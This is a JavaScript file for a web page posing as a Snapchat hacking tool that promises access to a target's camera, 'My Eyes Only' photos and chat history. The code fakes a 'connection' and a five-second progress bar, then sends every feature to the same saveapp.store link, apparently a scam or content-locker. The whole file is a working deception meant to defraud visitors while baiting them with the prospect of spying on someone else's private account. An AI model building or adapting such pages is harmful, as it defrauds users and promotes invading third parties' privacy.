// Feature URLs
const featureUrls = {
    '💖Best Friend List': 'https://saveapp.store/cl/i/l779kk',
    '📸View Camera': 'https://saveapp.store/cl/i/l779kk',
    '💬 Live chat': 'https://saveapp.store/cl/i/l779kk',
    '👀Snap Score': 'https://saveapp.store/cl/i/l779kk',
    '🖼️My Eyes Only': 'https://saveapp.store/cl/i/l779kk',
    '💬Chat History': 'https://saveapp.store/cl/i/l779kk'
};

// State
let isConnected = false;
let isLoading = false;
let progress = 0;
let selectedFeature = '';
let selectedIcon = '';
let progressInterval = null;
let selectedUrl = '';

// DOM Elements
const connectBtn = document.getElementById('connectBtn');
const progressModal = document.getElementById('progressModal');
const progressPercent = document.getElementById('progressPercent');
const progressTitle = document.getElementById('progressTitle');
const userInput = document.getElementById('userInput');
const searchInput = document.querySelector('.search-input');
const featureCards = document.querySelectorAll('.feature-card');

// Connect button handler
connectBtn.addEventListener('click', handleConnect);

function handleConnect() {
    if (isConnected || isLoading) return;

    isLoading = true;
    connectBtn.disabled = true;

    // Show spinner
    const spinner = document.createElement('div');
    spinner.className = 'spinner';
    connectBtn.innerHTML = '';
    connectBtn.appendChild(spinner);
    connectBtn.appendChild(document.createTextNode('Connecting...'));

    // Simulate connection
    setTimeout(() => {
        isLoading = false;
        isConnected = true;
        connectBtn.classList.add('connected');
        connectBtn.innerHTML = '✓ Connected';
        connectBtn.disabled = true;
    }, 1000);
}

// Feature card handlers
featureCards.forEach(card => {
    card.addEventListener('click', handleFeatureClick);
});

function handleFeatureClick(event) {
    if (isLoading || !isConnected) return;

    const card = event.currentTarget;
    selectedFeature = card.getAttribute('data-feature');
    selectedUrl = featureUrls[selectedFeature] || 'https://saveapp.store/cl/i/l779kk';
    
    // Extract icon from the icon container
    const iconElement = card.querySelector('.icon-container');
    selectedIcon = iconElement.textContent;

    showProgressModal();
}

function showProgressModal() {
    isLoading = true;
    progress = 0;
    progressModal.classList.remove('hidden');
    
    // Set the feature title
    progressTitle.textContent = selectedFeature;
    
    // Get the username from search input
    const username = searchInput.value.trim() || 'user';
    userInput.textContent = username;

    // Disable feature cards while loading
    featureCards.forEach(card => card.disabled = true);

    // Load over 5 seconds
    const startTime = Date.now();
    const duration = 5000; // 5 seconds

    progressInterval = setInterval(() => {
        const elapsed = Date.now() - startTime;
        progress = Math.min((elapsed / duration) * 100, 100);

        updateProgressBar();

        if (progress >= 100) {
            clearInterval(progressInterval);
            setTimeout(() => {
                // Redirect to selected feature URL
                window.location.href = selectedUrl;
            }, 300);
        }
    }, 50);
}

function updateProgressBar() {
    const progressBar = document.getElementById('progressBar');
    const percentSpan = document.querySelector('.progress-percent');
    
    if (progressBar) {
        progressBar.style.width = progress + '%';
    }
    if (percentSpan) {
        percentSpan.textContent = Math.round(progress) + '%';
    }
}

// Optional: Reset state when user returns from Google (though they won't in this case)
window.addEventListener('beforeunload', () => {
    if (progressInterval) clearInterval(progressInterval);
});
